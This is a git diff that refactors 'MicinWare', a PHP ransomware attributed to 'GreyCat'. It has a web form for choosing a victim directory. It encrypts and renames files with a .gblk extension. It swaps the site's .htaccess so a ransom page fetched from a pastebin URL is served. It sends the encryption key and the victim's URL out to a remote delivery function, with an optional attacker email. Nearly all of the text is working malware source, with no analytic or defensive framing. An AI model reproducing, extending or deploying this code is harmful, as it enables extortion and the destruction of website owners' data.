@@ -21,8 +21,7 @@ MicinWare::main();
 class MicinWare
 {
 	public static $attacker 	= 'GreyCat';
-	public static $mailAttacker = 'example@gmail.com';
-	public static $sendMail 	= false;//(Bool) is send to your email ? 
+	public static $mailAttacker = '';//fill it if u want to sendmail the key
 
 	public function main()
 	{
@@ -38,12 +37,12 @@ class MicinWare
 			switch ($type) 
 			{
 				case 'Cry':
-					self::_throwMicin($token,'Log');
-					self::execute($path,$token,'Cry');
+					self::_throwMicin($token,'Log',$path);
+					self::MicinCrypto($path,$token,'Cry');
 					break;
 				
 				case 'Decry':
-					self::execute($path,$key,'Decry');
+					self::MicinCrypto($path,$key,'Decry');
 					break;
 				default:
 					echo 'Choose of checkboxes -_-';
@@ -65,7 +64,7 @@ class MicinWare
 			    <title>MicinWare</title>
 
 			    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
-			    <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/exploreourbrain/CSS-MicinWare/master/style.css">
+			    <link rel="stylesheet" type="text/css" href="css/style.css">
 			    <link rel="shortcut icon" type="image/png" href="https://sensorstechforum.com/wp-content/uploads/2016/06/lock-padlock-symbol-for-security-interface.png"/>
 			    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 			    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
@@ -87,7 +86,7 @@ class MicinWare
 			            <input id="value3" type="radio" name="type" class="type" value="Decry"/>
 			            <label for="value3">deCry</label>
 			        </div>
-			        <input type="text" placeholder="Path ex: /var/www/html/victimDir" name="path" />
+			        <input type="text" placeholder="Path ex: /var/www/html/victimDir" name="path" value="'.getcwd().'"/>
 			        <input type="text" placeholder="Key Decryptor" id="key" style="display: none;" name="key" />
 
 			        <input type="submit" value="Submit" name="submit" />
@@ -113,20 +112,12 @@ class MicinWare
 		';
 	}
 
-	public function execute($dir='',$token='',$type='',&$result = array())
+	public function scanDir($dir='',$token='',&$result = array())
     {
     	$files 		= scandir($dir);
     	$extensions = array("jpg","png","gif","zip");//not encrypted
     	
-    	if ($type == 'Cry') 
-    	{
-    		self::generateMicin();
-    	}
-    	else
-    	{
-    		self::ungenerateMicin();
-    	}
-
+    	
 	    foreach($files as $key => $value)
 	    {
 	        $path = realpath($dir.'/'.$value);
@@ -137,64 +128,113 @@ class MicinWare
 				{
 		        	if ( !strpos($path,basename(__FILE__)) && !strpos($path,".htaccess") && !strpos($path,"greycat.php") && !strpos($path,"micin.php") )
 		        	{
-		        		switch ($type) 
-		        		{
-		        			case 'Cry':
-		        				//encrypt content
-		        				$Cry 	= self::micinCry(file_get_contents($path),$token);
-		        				$write 	= file_put_contents($path, $Cry);//Don't Cry baby
-
-		        				//encrypt filename
-		        				$rename = rename($path, self::micinCry($path,$token).".gblk");//Don't Cry baby
-
-		        				if ($write && $rename) 
-		        				{
-		        					echo "<i class='fa fa-check'></i> ".$path." <span style='color:lime;'>Encrypted</span><br>";
-		        				}
-		        				else
-		        				{
-
-		        					echo "<i class='fa fa-times'></i> ".$path." <span style='color:red;'>Failed !</span><br>";
-		        				}
-		        				break;
-		        			
-		        			case 'Decry':
-		        				//decrypt content
-		        				$deCry 	= self::micindeCry(file_get_contents($path),$token);
-		        				$write 	= file_put_contents($path, $deCry);
-
-		        				//decrypt filename
-		        				$rename = rename($path, self::micindeCry($path,$token));//Don't Cry baby
-
-		        				if ($write && $rename) 
-		        				{
-		        					echo "<i class='fa fa-check'></i> ".$path." <span style='color:lime;'>Decrypted ^_^ </span><br>";
-		        				}
-		        				else
-		        				{
-
-		        					echo "<i class='fa fa-times'></i> ".$path." <span style='color:red;'>Failed !</span><br>";
-		        				}
-		        				break;
-		        		}
-		        		
 		            	$result[] = $path;
 		        	}
           		}
 	        } 
 	        else if($value != "." && $value != ".." ) 
 	        {
-	            self::execute($path, $result);
+	            self::scanDir($path,$token, $result);
 	        }
 	        flush();
       		ob_flush();
 	    }
+
+	    return $result;
+    }
+
+    public function MicinCrypto($path='',$key='', $type='')
+    {
+    	if ($type == 'Cry') 
+    	{
+    		self::generateMicin();
+    	}
+    	else
+    	{
+    		self::ungenerateMicin();
+    	}
+
+    	$xData = self::scanDir($path,$key);
+    	echo "<table>";
+    	foreach ($xData as $no => $value) 
+    	{
+    		switch ($type) 
+			{
+				case 'Cry':
+					//encrypt content
+					$Cry 	= self::micinCry(file_get_contents($value),$key);
+
+					if (empty($Cry)) 
+					{
+						echo '<font color="red">[ - ] Something Wr0ng LoL ???</font>';
+						die();
+					}
+
+					$fp = fopen($value, 'w');
+					//encrypt filename
+					$rename = rename($value, dirname($value).'/'.urlencode(bin2hex(pathinfo($value, PATHINFO_BASENAME))).".gblk");//Don't Cry baby
+
+					if (fwrite($fp, $Cry)) 
+					{
+						echo "	<tr> 
+									<td><i class='fa fa-check' style='color:lime;'></i></td>
+									<td>".$value."</td> 
+									<td><span style='color:lime;'>Encrypted</span></td>
+								</tr>";
+					}
+					else
+					{
+						echo "	<tr>
+									<td><i class='fa fa-times' style='color:red;'></i></td>
+									<td>".$value."</td>
+									<td><span style='color:red;'>Failed !</span></td>
+								</tr>";
+					}
+					break;
+				
+				case 'Decry':
+					//decrypt content
+					$deCry 	= self::micindeCry(file_get_contents($value),$key);
+					if (empty($deCry)) 
+					{
+						echo '<font color="red">[ - ] Wr0ng Key LoL ???</font>';
+						die;
+					}
+					$fp = fopen($value, 'w');
+					//decrypt filename
+					$decryptName = explode(".", $value);
+					
+					$rename = rename($value, pathinfo($value,PATHINFO_DIRNAME).'/'.urldecode( hex2bin(pathinfo($decryptName[0],PATHINFO_BASENAME))));//Don't Cry baby
+
+					if (fwrite($fp, $deCry)) 
+					{
+						echo "	<tr>
+									<td><i class='fa fa-check' style='color:lime;'></i></td>
+									<td>".$value."</td>
+									<td><span style='color:lime;'>Decrypted </span></td>
+								</tr>";
+					}
+					else
+					{
+
+						echo "  <tr>
+									<td><i class='fa fa-times' style='color:red;'></i></td>
+									<td>".$value."</td>
+									<td><span style='color:red;'>Failed !</span></td>
+								</tr>";
+					}
+					break;
+			}
+			flush();
+      		ob_flush();
+    	}
+    	echo "</table>";
     }
 
    	private function getFileExtension($filename)
 	{
-		$path_info = pathinfo($filename);
-		return $path_info['extension'];
+		$path_info = pathinfo($filename,PATHINFO_EXTENSION);
+		return $path_info;
 	}
 
 	public function micinCry($plaintext='',$key='')
@@ -218,8 +258,8 @@ class MicinWare
 		$iv 				= substr($c, 0, $ivlen);
 		$hmac 				= substr($c, $ivlen, $sha2len=32);
 		$ciphertext_raw 	= substr($c, $ivlen+$sha2len);
-		$original_plaintext = @openssl_decrypt($ciphertext_raw, "aes-256-cbc", $key, $options, $iv);
-		$calcmac 			= @hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
+		$original_plaintext = openssl_decrypt($ciphertext_raw, "aes-256-cbc", $key, $options, $iv);
+		$calcmac 			= hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
 		if (hash_equals($hmac, $calcmac))
 		{
 		    return $original_plaintext."\n";
@@ -229,19 +269,25 @@ class MicinWare
 	public function generateMicin()
 	{
 		$check = file_exists(DOC_ROOT."/.htaccess.old");
+		
 		if (!$check) 
+		{
 			rename(DOC_ROOT.'/.htaccess', DOC_ROOT.'/.htaccess.old');
 			file_put_contents(DOC_ROOT.'/.htaccess', "DirectoryIndex greycat.php\nErrorDocument 404 /greycat.php");
 			file_put_contents(DOC_ROOT.'/greycat.php', file_get_contents("https://pastebin.com/raw/xBpsQ1Mw"));
+		}
 	}
 
 	public function ungenerateMicin()
 	{
 		$check = file_exists(DOC_ROOT."/.htaccess.old");
+
 		if (!$check) 
+		{
 			unlink(DOC_ROOT."/.htaccess");
 			unlink(DOC_ROOT."/greycat.php");
 			rename(DOC_ROOT.'/.htaccess.old', DOC_ROOT.'/.htaccess');
+		}
 	}
 
 	private function _deliveryMicin($url, $postVars = array())
@@ -278,7 +324,7 @@ class MicinWare
 					    'komposisi'    	=> $data,
 					    'you'			=> $actualLink,
 					    'micined'		=> ( isset($pathMicined) ? $pathMicined : ""),
-					    'email' 		=> ( self::$mailAttacker == true ? self::$mailAttacker : "")
+					    'email' 		=> ( self::$mailAttacker == true ? self::$mailAttacker : ""),
 					));
 		
 		return $result;
